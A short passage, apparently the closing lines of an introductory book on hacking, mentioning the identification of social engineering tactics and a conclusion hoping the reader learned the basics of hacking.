identify	social	engineering	tactics.    Conclusion  I	hope	this	book	was	able	to	help	you	learn	the	basics	of	hacking.
